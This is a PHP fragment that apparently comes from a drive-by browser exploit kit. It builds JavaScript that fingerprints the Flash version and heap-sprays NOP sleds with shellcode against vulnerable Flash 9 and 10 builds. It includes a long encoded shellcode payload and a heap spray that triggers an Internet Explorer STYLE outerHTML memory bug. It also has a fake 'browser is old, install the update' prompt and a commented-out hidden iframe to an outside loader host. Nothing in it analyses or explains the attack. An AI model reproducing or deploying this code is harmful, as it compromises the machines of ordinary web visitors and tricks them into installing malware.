    var d, n = navigator, m, f = \'Shockwave Flash\';
    if((m = n.mimeTypes) && (m = m["application/x-shockwave-flash"]) && m.enabledPlugin && (n = n.plugins) && n[f]) {d = n[f].description}
    else if (window.ActiveXObject) { try { d = (new ActiveXObject((f+\'.\'+f).replace(/ /g,\'\'))).GetVariable(\'$version\');} catch (e) {}}
    return d ? d.replace(/\D+/,\'\').split(/\D+/) : [0,0];
  }



function start_flash(){
document.write(\'<object width="50" height="40"><param name="movie" value="done.swf"><embed src="'.$url.'/98757182190.swf" width="550" height="400"></embed></object>\');
var memory;
var nop = unescape("%u0c0c%u0c0c");
var SC=unescape('._shellcode("flash").');
	while(nop.length <= 0x10000/2) nop+=nop;	
	nop=nop.substring(0,0x10000/2 - SC.length);	
	memory=new Array();
	for(i=0;i<0x800;i++){memory[i]=nop + SC;}
}

var verss = flash_version()[0]+"."+flash_version()[1]+"."+flash_version()[2];
if (flash_version()[0] == "10")
{
	if (flash_version()[2] < "32")
	{
		start_flash();
	}
	else
	{
//		document.write(\'<iframe src="http://domx0.cn/arend_my/load.php?spl=not" width="0" height="0" frameborder="0"></iframe>\');
	}
}
if  (flash_version()[0] == "9")
{
	if (flash_version()[2] < "246")
	{
		start_flash();
	}
}

';
return $content;
}

function soc()
{
global $soc_pack;
$O000000OO = '
<SCRIPT LANGUAGE="javascript">
function fakes()
{
if (confirm("Warning! Your browser is old. \n please install the update")) {
	parent.location="soc.php";
	
	}
else {
	
	
	}
}
fakes();
</SCRIPT>
';
if ($soc_pack =="0"){ $xxx = '';}
else $xxx = $O000000OO;
return $xxx;
}



function newie()
{
$O000000OO = '
function LoaD(){ document.getElementsByTagName(\'STYLE\')[0].outerHTML++; }
function HeapSpray(){
var unspacese = unescape;
var shellcode = unspacese("%uf527%uf940%u4991%uf59b%uf591%uf593%u3743%u4793%ufd96%u97d6%u4b97%u9046%u4643%u4296%u4f98%u4241%u929f%u4793%u4f41%u47f8%uf89b%u9f4b%u4ff8%u424f%u4099%u484e%u924b%u91fc%uf897%ufc90%u4a4e%ufd43%u9137%ufd9f%uf847%u48fc%u4242%uf599%u4bfd%ud69b%u9b42%u379b%u4092%u4ed6%u374b%u37f5%ufcd6%u4f41%u9291%u3749%u2797%u92d6%u2792%u41f8%u9741%u4048%u4143%u9f4b%u4a9b%u4296%u9b48%u9249%u4648%u9b4a%ufc96%u2ff5%u9b99%u4791%ufc91%ud6f9%u3791%uf527%u9b99%u374f%u969b%u9b4b%u40f8%u9b43%u9149%u4a92%u4891%ud62f%u41d6%u4f98%u4f42%ufc9f%u9090%u4a37%u9290%u4ad6%u9747%ufd49%u914b%u924e%u4f90%u4848%u43fc%u4040%u9941%u2743%u98f8%u3f47%u4892%u964a%ud637%u4a91%u49fc%u932f%uf527%u4646%u4990%u9196%ufc47%ud690%u9298%uf5f8%u91f9%u47f9%u4637%u99fc%u404f%u4048%u9246%u9947%u4e4e%u4a27%u9b96%u4bfc%u3f96%u49f8%u2f4f%u9b4f%ud693%uf84a%u90d6%u4391%ufc3f%u4342%u962f%u404f%u974a%ud69f%uf8f9%u4240%u9798%ufc93%u4947%ufd4b%u4240%u4b97%u4f37%u4e96%u4f96%u962f%u3741%u37f5%u4f42%uf84e%u9190%ufc90%u4e99%ufd4f%ufd9f%u4a47%u4e3f%ufc9b%u2f4b%u9393%ud63f%u4297%ufd93%u3f40%u4747%u9897%ufd46%u9396%u4392%u374b%u4743%ufc37%uf543%uf890%u4af9%u973f%u92f5%u27f9%u9891%u2fd6%ufc46%u4347%u4f91%u40f8%u4b96%u93f8%u9696%u472f%u9646%u3ff5%u9646%u9f43%u4296%u9340%u429b%u91fd%u464a%u49f9%u9b37%u4ad6%u47f9%u9f48%u37fd%u4391%u494f%u914b%ufc4a%u929b%u279f%uf52f%u4699%u96f5%u9f43%u4e27%u9927%u4a93%u922f%u4648%u4e9f%u4793%u4afc%uf837%ufc40%ufd4e%u96fd%u4a98%ufc3f%ufd4f%u4ffc%u3f4e%u92fc%u409b%u9140%u4640%u4697%u4b47%u4f90%u9f49%u2f41%u4190%ud69b%u37fc%u274f%u2f4f%u4f9f%u2f48%u4e40%u3f4a%u4f93%ufd97%u9b4b%u2748%u9999%u4f9f%u9292%u379b%u4f90%u93fc%u4f4b%u2793%u3793%u2f43%uf897%u414e%uf927%u4297%uf948%uf54b%u4afc%u9748%u2f2f%u9f46%uf94b%u3799%u9946%u4047%u494b%u9ff5%uf996%u492f%u3f93%u2ffc%u489f%u9843%u3f4e%u9848%ufd41%uf94b%u42fd%ud642%u372f%u42f9%ufd4e%u9f41%u4047%u4b2f%u964a%u4f2f%u97fc%u424b%u2740%u9bd6%u9341%u494f%ud6d6%u9147%u49fc%u4b4a%u92f5%uf54b%u4e4f%u3f4f%ufd99%u9bf8%u2797%u2f93%u9197%u2f42%u3f2f%u2742%u9b4e%u42f5%u4143%uf896%u484f%ud647%u272f%u96fc%u9349%u4697%uf597%uf83f%u2f97%u9198%u4193%u429f%u4b48%u4349%u914e%u2fd6%u9b2f%u4f98%u9b93%u4827%u4698%u4a9f%uf54b%u4f47%u9f9b%u924f%u9143%u9642%u91f8%uf549%u9992%u9327%uf8f5%u4691%u91fc%u9237%u46fd%u3f92%ud646%u3f49%u37f9%u4999%u9692%u4a9f%u902f%u929b%u4698%u4f91%u9393%u4342%u4837%u3348%ub1c9%uba34%ubfe7%ub4f5%uc4d9%u74d9%uf424%u315e%u1056%uc683%u0304%u0c56%u4a05%u7074%u479d%u8688%u40e1%u79fe%u9119%uf361%ua0fc%u67b3%u9075%ue303%u19db%ua1ef%uaacf%u6d9d%u1be0%u482b%u9ccf%u549d%u5f83%u28bf%ub3d9%u101f%uc612%u555e%u294e%u0e32%u9805%u3ba3%u215b%uebc5%u19d0%u8ebd%ued26%u9077%u5e76%uda03%ud46e%ufb4b%u398f%uc788%u36c6%ub37b%u9ed9%u3cb5%udee8%u031a%ud2c5%u4363%u0ce1%ubf16%ub012%u0421%u6e69%u99a7%ue5c9%u7a1f%u2ae8%u09f9%u87e6%u568d%u16ea%ued41%u9216%u2264%ue09f%ue642%ub3c4%ubfeb%u12a0%udf13%uca0c%uabb1%u1fbe%uf1c3%uded4%u8c41%ue191%u8f59%u89b1%u0468%ucd5e%ucf74%u311b%uda97%uda51%u8f0e%u87d8%u65b0%ube1e%u8c32%u45de%ue52a%u02db%u15ec%u1b91%u1999%u1b06%u7988%u8fc9%u5050%u286c%uacf2");
var bigblock = unspacese( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );
var headersize = 20 + shellcode.length;
while (bigblock.length < headersize) bigblock+=bigblock;
fillblock = bigblock.substring(0,headersize);
block  = bigblock.substring(0,bigblock.length-headersize);
while(block .length+headersize < 0x90000) block  = block +block +fillblock;
var memory = new Array();
for (cnt=0;cnt<1000;cnt++) memory[cnt]=block +shellcode;
LoaD();
}
';
$xxx = '';
return $O000000OO;
}





?>